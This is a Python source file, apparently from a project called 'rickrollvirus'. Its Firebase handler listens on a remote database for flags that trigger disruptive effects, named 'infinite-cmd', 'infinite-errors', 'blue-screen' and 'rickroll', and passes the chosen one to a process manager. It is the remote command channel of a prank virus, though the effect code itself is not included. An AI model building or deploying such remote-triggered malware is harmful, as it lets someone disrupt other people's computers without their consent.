import pyrebase
from threading import Condition


class FirebaseHandler():
    """ This class' function is to Handle the communication between the Firebase server and the code running in my computer"""
    #TODO: MAKE A METHOD WITH THREADING THAT CHECK IF A PROCCES HAS BEEN TRIGGERED
    def __init__(self):
      self.config = { 

        "apiKey": "API KEY HERE",

        "authDomain": "rickrollvirus.firebaseapp.com",

        "databaseURL": "https://rickrollvirus-default-rtdb.firebaseio.com",

        "storageBucket": "rickrollvirus.appspot.com",
      }
      
      self.firebase_app = pyrebase.initialize_app(self.config)
      self.db = self.firebase_app.database()

      self.activeprocess = ""
      
      self.data = {
          "processes/": {
              "infinite-cmd": False,
              "rickroll": False,
              "infinite-errors": False,
              "blue-screen": False

          }
      }
      
    
    def checkProcess(self, message):
      """ Method that checks if a determinate process is Active.
          
          Args: 

          :param process: the process that is gonna be activated 

         
      """
      print(message["path"]) # /-K7yGTTEp7O549EzTYtI
      print(message["data"]) # {'title': 'Pyrebase', "body": "etc..."}
      print(type(message["data"]))
      
      if (message["data"] == True):
        print(message["path"])
        self.activeprocess = message["path"][1:]
        print(self.activeprocess)

    def processListener(self):
      """
      Generates a stream with firebase REST API 
      """
      self.stream = self.db.child("processes").stream(self.checkProcess)
    
    def getProcess(self):
      """
      Closes the stream and restores the process in the database to False

       Returns:

       :process: The string of the process that is going to be run by the Process Manager
      """
      self.cond = Condition()
      self.cond.acquire()
      try:
        print("Waiting ...")
        while self.activeprocess == "":
          pass
        self.cond.notify()
      finally:
        self.cond.release()
        print("Connected!")
      
      self.stream.close()

      self.process = self.activeprocess
      self.db.update(self.data)
      



      return "-" + self.process
      
      
      




    
    













